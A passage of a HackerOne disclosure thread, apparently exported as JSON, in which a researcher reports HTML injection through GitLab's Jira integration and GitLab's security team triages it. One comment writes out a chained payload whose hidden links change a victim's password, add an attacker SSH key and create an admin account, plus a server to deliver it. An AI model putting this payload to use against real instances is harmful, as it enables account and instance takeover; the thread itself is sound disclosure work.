          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/9865qc9er7t2lratx5rgszbf3257/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89?response-content-disposition=inline%3B%20filename%3D%224FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg%22%3B%20filename%2A%3DUTF-8%27%274FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ363NV4N%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065959Z&X-Amz-Expires=1095&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJHMEUCIQCUKMH71SIb%2FoTww4o7Fyp5mQhZVTwsH6dhlfwUD7S8TwIgF4Omzzgoy7Eh%2FuuaDn6bJadywjrFCwcrXLyPd1UCs5kqsQUIIhADGgwwMTM2MTkyNzQ4NDkiDKGxZrCtnfrI2eKhbiqOBXD0daRtK7nXN8bU4wh8rs0TwC9%2FcJa7QcdjP2SAL2YxL6GkwLVHnakg45WQ%2BWk4Adhd6eDu4AekBKcLFkFd8k%2Fd5lubZW1GVCKCIIzX8mIHtiR6NWgAL1RYXyLJqsBolJgkbfAKgnxB2VBNu9cqdN0Sg6q46Ilnq1hqExJMLfqht15NsELU1U%2FQ19p63tws1LUaitduuiCmfbNrtck%2BJiuxte1AqtVx350x7u7AVd0SqMQXMgYhUrdnfQGkHw4PKw01gqvsRv0qYiR5T%2BJ02lVmbMGvHW0qzI3DYYUFIGfXcUFnGQSIaE%2FgPqRPsEBM6Lwmyz7ekYcfG4NAQPkX7s7d3l%2BAxF8xABewHt3siqiqDRwd%2BQ4qbNSRRB2PkDbmZ1eHzYDk4QbTDmVKIFyPKrkIkVF4XR4g2Coeli7hvF%2BckBOmv0p8iVYfRcyovSIhcdl6kBxgYFShVu%2FoppYowWnD2wehXrreQsVGuk%2FSEDklipqIstWBh044DkhjHK38BO2tKoCbBEd3HL%2F%2BCSTk87EjIAnzFVx1G%2Bg0F2Yj%2FB8WgRs4oGUj%2F%2FugSeXVb7VtlulwRZSm%2BK3L%2BBvsp0VDMXQNBHJyKN5tTlj1qWo5o325Ubas8A3WgFHAJYPgq4gNHNsbElI8w6eB%2BoTxkjdH2%2B5YcHseEpZR6D9yp11HZu1B1Z9ccVeEbWoll9F%2Fl90jl7Darf0cRBdETJBVQe9lES5xsNEsTzJCU0hJC7cbhVgiFsvjy%2BsmVYuW%2BJ0Ir2DYYd%2BEAKSEPkMQzbR5JEOhhY35l4K5u%2FzDZNGAuBAAEQtj%2F79KdtjYW%2Fo3zHs0RmQMmpWUybphGAceZplAaCh5JeuSBsicB56wWgZXYoeowzDl%2BLioBjqxAavr89KptASCwoBoIcJJ1%2F%2F5OLzjaOfXS9rhOyPfMD4r39NrVSBqOuZEqOKLh8OZun7ZmvuZ6d%2Bu0%2Fq3yH0BFxg8fSuBxWsADt3u8ZMwDmRFAsTmr%2Fi0BfAgyXp3o3mJLIlnT3C6KGPZgG5zSxpe1VPmWP4RCUXcoIqHJJNfyToajUXSYsPPP%2FGEYB7eJNBTLXBAPJRkz74FOOGIE7hFLR1tttCq48hFanfnz69J0GhsHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4fc25536f8ae40162f22df951b078f639b207f19c9a448e3d09abfeaa917db37"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 16264373,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Just noticed that I had mixed up my latest comment about my \"fake Jira server\". I mention both\n\nhttps://joaxcar.com/rest/api/2/issue/HACKER1\nand\nhttps://joaxcar.com/rest/api/2/issue/HACK1\n\nI have added both to my `.htaccess` file now, so any of the patters work. Sorry if it confused anything during testing",
      "automated_response": false,
      "created_at": "2022-04-13T05:18:19.276Z",
      "updated_at": "2022-04-13T05:18:59.226Z",
      "actor": {
        "username": "joaxcar",
        "cleared": false,
        "verified": true,
        "url": "/joaxcar",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/9865qc9er7t2lratx5rgszbf3257/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89?response-content-disposition=inline%3B%20filename%3D%224FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg%22%3B%20filename%2A%3DUTF-8%27%274FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ363NV4N%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065959Z&X-Amz-Expires=1095&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJHMEUCIQCUKMH71SIb%2FoTww4o7Fyp5mQhZVTwsH6dhlfwUD7S8TwIgF4Omzzgoy7Eh%2FuuaDn6bJadywjrFCwcrXLyPd1UCs5kqsQUIIhADGgwwMTM2MTkyNzQ4NDkiDKGxZrCtnfrI2eKhbiqOBXD0daRtK7nXN8bU4wh8rs0TwC9%2FcJa7QcdjP2SAL2YxL6GkwLVHnakg45WQ%2BWk4Adhd6eDu4AekBKcLFkFd8k%2Fd5lubZW1GVCKCIIzX8mIHtiR6NWgAL1RYXyLJqsBolJgkbfAKgnxB2VBNu9cqdN0Sg6q46Ilnq1hqExJMLfqht15NsELU1U%2FQ19p63tws1LUaitduuiCmfbNrtck%2BJiuxte1AqtVx350x7u7AVd0SqMQXMgYhUrdnfQGkHw4PKw01gqvsRv0qYiR5T%2BJ02lVmbMGvHW0qzI3DYYUFIGfXcUFnGQSIaE%2FgPqRPsEBM6Lwmyz7ekYcfG4NAQPkX7s7d3l%2BAxF8xABewHt3siqiqDRwd%2BQ4qbNSRRB2PkDbmZ1eHzYDk4QbTDmVKIFyPKrkIkVF4XR4g2Coeli7hvF%2BckBOmv0p8iVYfRcyovSIhcdl6kBxgYFShVu%2FoppYowWnD2wehXrreQsVGuk%2FSEDklipqIstWBh044DkhjHK38BO2tKoCbBEd3HL%2F%2BCSTk87EjIAnzFVx1G%2Bg0F2Yj%2FB8WgRs4oGUj%2F%2FugSeXVb7VtlulwRZSm%2BK3L%2BBvsp0VDMXQNBHJyKN5tTlj1qWo5o325Ubas8A3WgFHAJYPgq4gNHNsbElI8w6eB%2BoTxkjdH2%2B5YcHseEpZR6D9yp11HZu1B1Z9ccVeEbWoll9F%2Fl90jl7Darf0cRBdETJBVQe9lES5xsNEsTzJCU0hJC7cbhVgiFsvjy%2BsmVYuW%2BJ0Ir2DYYd%2BEAKSEPkMQzbR5JEOhhY35l4K5u%2FzDZNGAuBAAEQtj%2F79KdtjYW%2Fo3zHs0RmQMmpWUybphGAceZplAaCh5JeuSBsicB56wWgZXYoeowzDl%2BLioBjqxAavr89KptASCwoBoIcJJ1%2F%2F5OLzjaOfXS9rhOyPfMD4r39NrVSBqOuZEqOKLh8OZun7ZmvuZ6d%2Bu0%2Fq3yH0BFxg8fSuBxWsADt3u8ZMwDmRFAsTmr%2Fi0BfAgyXp3o3mJLIlnT3C6KGPZgG5zSxpe1VPmWP4RCUXcoIqHJJNfyToajUXSYsPPP%2FGEYB7eJNBTLXBAPJRkz74FOOGIE7hFLR1tttCq48hFanfnz69J0GhsHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4fc25536f8ae40162f22df951b078f639b207f19c9a448e3d09abfeaa917db37"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 16285098,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Thanks for submitting this report, @joaxcar! I've started working to reproduce this finding.\n\nIt looks like the `data_example.json` file is invalid JSON. Is there any chance you could take a look and see if you spot what might be wrong? I'm going to spend more time on it tomorrow and can probably get it figured out via some beautifiers/linters, but I thought I'd ask just in case you were able to find it in the meantime.\n\nThanks and have a great day,\nAndrew\nSecurity Team | GitLab",
      "automated_response": false,
      "created_at": "2022-04-13T22:46:50.697Z",
      "updated_at": "2022-04-13T22:47:24.611Z",
      "actor": {
        "username": "akelly",
        "cleared": false,
        "verified": false,
        "url": "/akelly",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 16287172,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @akelly thanks for looking into the report! And great to see you here at H1 again, our roads have not crossed here for a while :)\n\nI cant find anything wrong with the data in the example file. At what stage is it giving you an error?\n\nWhat I can think of is that you probably need to serve it with a correct mime-type (`application/json`) to get GitLab to accept it as an API response. I just hosted the file on my regular hosting provider. Links\n\nhttps://joaxcar.com/rest/api/2/issue/HACK1\n\nhttps://joaxcar.com/rest/api/2/issue/HACK2\n\nhttps://joaxcar.com/rest/api/2/issue/HACK3\n\nhttps://joaxcar.com/rest/api/2/issue/HACK4\n\nThis will respond with the correct mime-type (and encode the payload in Base64 as it semes)\n\nTo mimic this locally you can run a modified version of the Python basic HTTP server. Create a file `server.py` containing\n```python\nfrom os import path\nimport http.server\nimport socketserver\n\nPORT = 8080\ndir = path.abspath(path.dirname(__file__))\n\nclass HttpRequestHandler(http.server.SimpleHTTPRequestHandler):\n    def do_GET( self ):\n        self.send_response(200)\n        self.send_header( 'Content-type', 'application/json' )\n        self.end_headers()\n        self.wfile.write( self.getContent(self.getPath()) )\n\n    def getPath(self):\n        return path.join(dir, 'data_example.json')\n\n    def getContent(self, content_path):\n        with open(content_path, mode='r', encoding='utf-8') as f:\n            content = f.read()\n        return bytes(content, 'utf-8')\n\nhttpd = socketserver.TCPServer((\"localhost\", PORT), HttpRequestHandler)\n\ntry:\n    print(f\"serving at http://localhost:{PORT}\")\n    httpd.serve_forever()\nexcept KeyboardInterrupt:\n    pass\n```\nand put this file in the same directory as the example data files you want to serve.\n```\n/\n   server.py\n   data_example.json\n```\nthen run\n```sh\npython3 ./server.py\n```\nVisiting http://localhost:8080/ANYPATH should now present you with a valid JSON response. The server returns the same file for all requests so it will answer correctly for /rest/api/2/issue/KEY\n\nThe payload is present in the `summary` field of the JSON. (not the empty one, there are two summary fields). And my last example HACK4 contains a concatenation of all three attacks like so\n```json\nsummary: \"<a href=http://j15.se class=\\\"js-feature-highlight\\\" style=\\\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1005\\\">.</a><div class=\\\"js-new-user-signups-cap-reached\\\"  data-dismiss-endpoint=\\\"/-/profile/password?_method=put&user%5Bnew_password%5D=12345678&user%5Bpassword_confirmation%5D=12345678\\\" data-feature-id=\\\"1\\\"><a href=\\\"https://joaxcar.com\\\" style=\\\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1004\\\" class=\\\"js-close deferred-link\\\">.</a></div><div class=\\\"js-users-over-license-callout\\\" data-dismiss-endpoint=\\\"/api/v4/user/keys?title=hack&key=ssh-ed25519%20AAAAC3NzaC1lZDI1NTE5AAAAIDpz7b7pozVlAnzLfWhrAB7wUAPce0KcfY9ZsS4TIpkW%20jcar@MINDARO\\\" data-feature-id=\\\"2\\\"><a href=\\\"https://joaxcar.com\\\" style=\\\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1002\\\" class=\\\"js-close\\\">.</a></div><div class=\\\"js-recovery-settings-callout\\\"  data-dismiss-endpoint=\\\"/api/v4/users?admin=true&email=joaxcar@wearehackerone.com&name=newadmin&username=newadmin&password=asdasdasdasd&skip_confirmation=true\\\" data-feature-id=\\\"3\\\"><a href=\\\"https://joaxcar.com\\\" style=\\\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\\\" class=\\\"js-close deferred-link\\\">.</a></div>\"\n```\nTo simplify testing you could just replace this part with\n```json\nsummary: \"<img src=#>\"\n```\nto get a broken image as the issue title.\n\n\nI hope this will sort things out. Otherwise, just get back with more details on what is breaking, and I will try to help the best I can!\n\n(and a final note. Whenever testing with the SSH-key injection payload. Make sure to go to the user profile and remove the key after a successful attack, as the key can only be added to one user account at a time!)",
      "automated_response": false,
      "created_at": "2022-04-14T05:49:07.510Z",
      "updated_at": "2022-04-14T05:49:07.510Z",
      "actor": {
        "username": "joaxcar",
        "cleared": false,
        "verified": true,
        "url": "/joaxcar",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/9865qc9er7t2lratx5rgszbf3257/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89?response-content-disposition=inline%3B%20filename%3D%224FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg%22%3B%20filename%2A%3DUTF-8%27%274FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ363NV4N%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065959Z&X-Amz-Expires=1095&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJHMEUCIQCUKMH71SIb%2FoTww4o7Fyp5mQhZVTwsH6dhlfwUD7S8TwIgF4Omzzgoy7Eh%2FuuaDn6bJadywjrFCwcrXLyPd1UCs5kqsQUIIhADGgwwMTM2MTkyNzQ4NDkiDKGxZrCtnfrI2eKhbiqOBXD0daRtK7nXN8bU4wh8rs0TwC9%2FcJa7QcdjP2SAL2YxL6GkwLVHnakg45WQ%2BWk4Adhd6eDu4AekBKcLFkFd8k%2Fd5lubZW1GVCKCIIzX8mIHtiR6NWgAL1RYXyLJqsBolJgkbfAKgnxB2VBNu9cqdN0Sg6q46Ilnq1hqExJMLfqht15NsELU1U%2FQ19p63tws1LUaitduuiCmfbNrtck%2BJiuxte1AqtVx350x7u7AVd0SqMQXMgYhUrdnfQGkHw4PKw01gqvsRv0qYiR5T%2BJ02lVmbMGvHW0qzI3DYYUFIGfXcUFnGQSIaE%2FgPqRPsEBM6Lwmyz7ekYcfG4NAQPkX7s7d3l%2BAxF8xABewHt3siqiqDRwd%2BQ4qbNSRRB2PkDbmZ1eHzYDk4QbTDmVKIFyPKrkIkVF4XR4g2Coeli7hvF%2BckBOmv0p8iVYfRcyovSIhcdl6kBxgYFShVu%2FoppYowWnD2wehXrreQsVGuk%2FSEDklipqIstWBh044DkhjHK38BO2tKoCbBEd3HL%2F%2BCSTk87EjIAnzFVx1G%2Bg0F2Yj%2FB8WgRs4oGUj%2F%2FugSeXVb7VtlulwRZSm%2BK3L%2BBvsp0VDMXQNBHJyKN5tTlj1qWo5o325Ubas8A3WgFHAJYPgq4gNHNsbElI8w6eB%2BoTxkjdH2%2B5YcHseEpZR6D9yp11HZu1B1Z9ccVeEbWoll9F%2Fl90jl7Darf0cRBdETJBVQe9lES5xsNEsTzJCU0hJC7cbhVgiFsvjy%2BsmVYuW%2BJ0Ir2DYYd%2BEAKSEPkMQzbR5JEOhhY35l4K5u%2FzDZNGAuBAAEQtj%2F79KdtjYW%2Fo3zHs0RmQMmpWUybphGAceZplAaCh5JeuSBsicB56wWgZXYoeowzDl%2BLioBjqxAavr89KptASCwoBoIcJJ1%2F%2F5OLzjaOfXS9rhOyPfMD4r39NrVSBqOuZEqOKLh8OZun7ZmvuZ6d%2Bu0%2Fq3yH0BFxg8fSuBxWsADt3u8ZMwDmRFAsTmr%2Fi0BfAgyXp3o3mJLIlnT3C6KGPZgG5zSxpe1VPmWP4RCUXcoIqHJJNfyToajUXSYsPPP%2FGEYB7eJNBTLXBAPJRkz74FOOGIE7hFLR1tttCq48hFanfnz69J0GhsHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4fc25536f8ae40162f22df951b078f639b207f19c9a448e3d09abfeaa917db37"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 1692468,
          "filename": "data_example.json",
          "type": "application/json",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/um5uus21qmq8411fiacayq4qgpfw?response-content-disposition=attachment%3B%20filename%3D%22data_example.json%22%3B%20filename%2A%3DUTF-8%27%27data_example.json&response-content-type=application%2Fjson&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ363NV4N%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065959Z&X-Amz-Expires=1095&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJHMEUCIQCUKMH71SIb%2FoTww4o7Fyp5mQhZVTwsH6dhlfwUD7S8TwIgF4Omzzgoy7Eh%2FuuaDn6bJadywjrFCwcrXLyPd1UCs5kqsQUIIhADGgwwMTM2MTkyNzQ4NDkiDKGxZrCtnfrI2eKhbiqOBXD0daRtK7nXN8bU4wh8rs0TwC9%2FcJa7QcdjP2SAL2YxL6GkwLVHnakg45WQ%2BWk4Adhd6eDu4AekBKcLFkFd8k%2Fd5lubZW1GVCKCIIzX8mIHtiR6NWgAL1RYXyLJqsBolJgkbfAKgnxB2VBNu9cqdN0Sg6q46Ilnq1hqExJMLfqht15NsELU1U%2FQ19p63tws1LUaitduuiCmfbNrtck%2BJiuxte1AqtVx350x7u7AVd0SqMQXMgYhUrdnfQGkHw4PKw01gqvsRv0qYiR5T%2BJ02lVmbMGvHW0qzI3DYYUFIGfXcUFnGQSIaE%2FgPqRPsEBM6Lwmyz7ekYcfG4NAQPkX7s7d3l%2BAxF8xABewHt3siqiqDRwd%2BQ4qbNSRRB2PkDbmZ1eHzYDk4QbTDmVKIFyPKrkIkVF4XR4g2Coeli7hvF%2BckBOmv0p8iVYfRcyovSIhcdl6kBxgYFShVu%2FoppYowWnD2wehXrreQsVGuk%2FSEDklipqIstWBh044DkhjHK38BO2tKoCbBEd3HL%2F%2BCSTk87EjIAnzFVx1G%2Bg0F2Yj%2FB8WgRs4oGUj%2F%2FugSeXVb7VtlulwRZSm%2BK3L%2BBvsp0VDMXQNBHJyKN5tTlj1qWo5o325Ubas8A3WgFHAJYPgq4gNHNsbElI8w6eB%2BoTxkjdH2%2B5YcHseEpZR6D9yp11HZu1B1Z9ccVeEbWoll9F%2Fl90jl7Darf0cRBdETJBVQe9lES5xsNEsTzJCU0hJC7cbhVgiFsvjy%2BsmVYuW%2BJ0Ir2DYYd%2BEAKSEPkMQzbR5JEOhhY35l4K5u%2FzDZNGAuBAAEQtj%2F79KdtjYW%2Fo3zHs0RmQMmpWUybphGAceZplAaCh5JeuSBsicB56wWgZXYoeowzDl%2BLioBjqxAavr89KptASCwoBoIcJJ1%2F%2F5OLzjaOfXS9rhOyPfMD4r39NrVSBqOuZEqOKLh8OZun7ZmvuZ6d%2Bu0%2Fq3yH0BFxg8fSuBxWsADt3u8ZMwDmRFAsTmr%2Fi0BfAgyXp3o3mJLIlnT3C6KGPZgG5zSxpe1VPmWP4RCUXcoIqHJJNfyToajUXSYsPPP%2FGEYB7eJNBTLXBAPJRkz74FOOGIE7hFLR1tttCq48hFanfnz69J0GhsHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5622826d0f453c98fc0f8413bc3efeb068c3a32d1f711f04f3261ca3df8c916c"
        },
        {
          "id": 1692467,
          "filename": "server.py",
          "type": "text/x-python",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ifb84wg7h8fva3njdfj5gkuds792?response-content-disposition=attachment%3B%20filename%3D%22server.py%22%3B%20filename%2A%3DUTF-8%27%27server.py&response-content-type=text%2Fx-python&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ363NV4N%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065959Z&X-Amz-Expires=1095&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJHMEUCIQCUKMH71SIb%2FoTww4o7Fyp5mQhZVTwsH6dhlfwUD7S8TwIgF4Omzzgoy7Eh%2FuuaDn6bJadywjrFCwcrXLyPd1UCs5kqsQUIIhADGgwwMTM2MTkyNzQ4NDkiDKGxZrCtnfrI2eKhbiqOBXD0daRtK7nXN8bU4wh8rs0TwC9%2FcJa7QcdjP2SAL2YxL6GkwLVHnakg45WQ%2BWk4Adhd6eDu4AekBKcLFkFd8k%2Fd5lubZW1GVCKCIIzX8mIHtiR6NWgAL1RYXyLJqsBolJgkbfAKgnxB2VBNu9cqdN0Sg6q46Ilnq1hqExJMLfqht15NsELU1U%2FQ19p63tws1LUaitduuiCmfbNrtck%2BJiuxte1AqtVx350x7u7AVd0SqMQXMgYhUrdnfQGkHw4PKw01gqvsRv0qYiR5T%2BJ02lVmbMGvHW0qzI3DYYUFIGfXcUFnGQSIaE%2FgPqRPsEBM6Lwmyz7ekYcfG4NAQPkX7s7d3l%2BAxF8xABewHt3siqiqDRwd%2BQ4qbNSRRB2PkDbmZ1eHzYDk4QbTDmVKIFyPKrkIkVF4XR4g2Coeli7hvF%2BckBOmv0p8iVYfRcyovSIhcdl6kBxgYFShVu%2FoppYowWnD2wehXrreQsVGuk%2FSEDklipqIstWBh044DkhjHK38BO2tKoCbBEd3HL%2F%2BCSTk87EjIAnzFVx1G%2Bg0F2Yj%2FB8WgRs4oGUj%2F%2FugSeXVb7VtlulwRZSm%2BK3L%2BBvsp0VDMXQNBHJyKN5tTlj1qWo5o325Ubas8A3WgFHAJYPgq4gNHNsbElI8w6eB%2BoTxkjdH2%2B5YcHseEpZR6D9yp11HZu1B1Z9ccVeEbWoll9F%2Fl90jl7Darf0cRBdETJBVQe9lES5xsNEsTzJCU0hJC7cbhVgiFsvjy%2BsmVYuW%2BJ0Ir2DYYd%2BEAKSEPkMQzbR5JEOhhY35l4K5u%2FzDZNGAuBAAEQtj%2F79KdtjYW%2Fo3zHs0RmQMmpWUybphGAceZplAaCh5JeuSBsicB56wWgZXYoeowzDl%2BLioBjqxAavr89KptASCwoBoIcJJ1%2F%2F5OLzjaOfXS9rhOyPfMD4r39NrVSBqOuZEqOKLh8OZun7ZmvuZ6d%2Bu0%2Fq3yH0BFxg8fSuBxWsADt3u8ZMwDmRFAsTmr%2Fi0BfAgyXp3o3mJLIlnT3C6KGPZgG5zSxpe1VPmWP4RCUXcoIqHJJNfyToajUXSYsPPP%2FGEYB7eJNBTLXBAPJRkz74FOOGIE7hFLR1tttCq48hFanfnz69J0GhsHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7ed885cd098a533ebb32a98ecb26769431ff3cab40500faf58ecad0db3c60c27"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 16301474,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "Hello @joaxcar,\n\nThanks for following up. As always, we very much appreciate the time and effort that you put into your high quality reports!\n\nWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab/-/issues/359142.  This issue will be made public 30 days following the release of a patch.\n\nWe will continue to update you via HackerOne as a patch is scheduled for release.\n\nHave a great day,\nAndrew\nSecurity Team | GitLab",
      "automated_response": false,
      "created_at": "2022-04-14T22:51:40.575Z",
      "updated_at": "2022-04-14T22:51:40.575Z",
      "actor": {
        "username": "akelly",
        "cleared": false,
        "verified": false,
        "url": "/akelly",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 16301477,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BountyAwarded",
      "message": "Given the severity of the report, we are paying an initial $1000 on triage. Congratulations!\n\nWe will continue to update you via HackerOne as a patch is scheduled for release.\n\nBest regards,\nGitLab Security Team",
      "automated_response": false,
      "created_at": "2022-04-14T22:52:33.272Z",
      "updated_at": "2022-04-14T22:52:33.272Z",
      "actor": {
        "url": "/gitlab",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "GitLab"
        }
      },
      "bounty_amount": "1000.0",
      "bonus_amount": "0.0",
      "bounty_currency": "usd",
      "genius_execution_id": null,
      "team_handle": "gitlab",
      "collaborator": {
        "username": "joaxcar",
        "url": "/joaxcar"
      }
    },
    {
      "id": 16378673,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "ETA for fix:\n\nHi @joaxcar,\n\nThe issue you reported is currently scheduled to be fixed by 2022-06-30.\n\nThank you again for contacting us!\n\nBest regards,\nGitLab Security Team\n",
      "automated_response": true,
      "created_at": "2022-04-21T04:04:04.841Z",
      "updated_at": "2022-04-21T04:04:04.841Z",
      "actor": {
        "username": "gitlab-securitybot",
        "cleared": false,
        "verified": false,
        "url": "/gitlab-securitybot",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 16448183,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi again @akelly thank you for triaging this!\n\nJust wanted to add some last tidbits regarding impact. Don't know if it matters for CVSS, but might add some understanding of the scope of the bug.\n\nIn a worst case scenario here, an attacker would be able to attack a GitLab \"unauthenticated\". The attacker would need access to the Jira project, but this would be enough to be able to pull of the initial (length restricted) attack from my original report. This would enable for a user with access to Jira to penetrate into a locked down GitLab instance.\n\nThis also extends to the impact when using this as an attack on victim owned projects, where the attacker is able to create Jira issues.\n\nSo there is essentially two attack paths, requiring different levels of access:\n\n1. A user have access to create Issues in a Jira project that is connected to a GitLab project. In this case the attacker can only use the limited payloads but does not need ANY access to the GitLab instance. (I dont know if this is enough to lower the CVSS priv req to `None` as the user still needs access to the Jira project) \n\n2. An attacker creates his/her own project (or gains maintainer access to a project) and is thus in control of the Jira settings. Now the attacker can use the \"extended payloads\" with full impact. This does require access to the GitLab instance.\n\nBest regards\nJohan",
      "automated_response": false,
      "created_at": "2022-04-27T07:11:42.747Z",
      "updated_at": "2022-04-27T07:11:42.747Z",
      "actor": {
        "username": "joaxcar",
        "cleared": false,
        "verified": true,
        "url": "/joaxcar",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/9865qc9er7t2lratx5rgszbf3257/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89?response-content-disposition=inline%3B%20filename%3D%224FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg%22%3B%20filename%2A%3DUTF-8%27%274FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ363NV4N%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065959Z&X-Amz-Expires=1095&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJHMEUCIQCUKMH71SIb%2FoTww4o7Fyp5mQhZVTwsH6dhlfwUD7S8TwIgF4Omzzgoy7Eh%2FuuaDn6bJadywjrFCwcrXLyPd1UCs5kqsQUIIhADGgwwMTM2MTkyNzQ4NDkiDKGxZrCtnfrI2eKhbiqOBXD0daRtK7nXN8bU4wh8rs0TwC9%2FcJa7QcdjP2SAL2YxL6GkwLVHnakg45WQ%2BWk4Adhd6eDu4AekBKcLFkFd8k%2Fd5lubZW1GVCKCIIzX8mIHtiR6NWgAL1RYXyLJqsBolJgkbfAKgnxB2VBNu9cqdN0Sg6q46Ilnq1hqExJMLfqht15NsELU1U%2FQ19p63tws1LUaitduuiCmfbNrtck%2BJiuxte1AqtVx350x7u7AVd0SqMQXMgYhUrdnfQGkHw4PKw01gqvsRv0qYiR5T%2BJ02lVmbMGvHW0qzI3DYYUFIGfXcUFnGQSIaE%2FgPqRPsEBM6Lwmyz7ekYcfG4NAQPkX7s7d3l%2BAxF8xABewHt3siqiqDRwd%2BQ4qbNSRRB2PkDbmZ1eHzYDk4QbTDmVKIFyPKrkIkVF4XR4g2Coeli7hvF%2BckBOmv0p8iVYfRcyovSIhcdl6kBxgYFShVu%2FoppYowWnD2wehXrreQsVGuk%2FSEDklipqIstWBh044DkhjHK38BO2tKoCbBEd3HL%2F%2BCSTk87EjIAnzFVx1G%2Bg0F2Yj%2FB8WgRs4oGUj%2F%2FugSeXVb7VtlulwRZSm%2BK3L%2BBvsp0VDMXQNBHJyKN5tTlj1qWo5o325Ubas8A3WgFHAJYPgq4gNHNsbElI8w6eB%2BoTxkjdH2%2B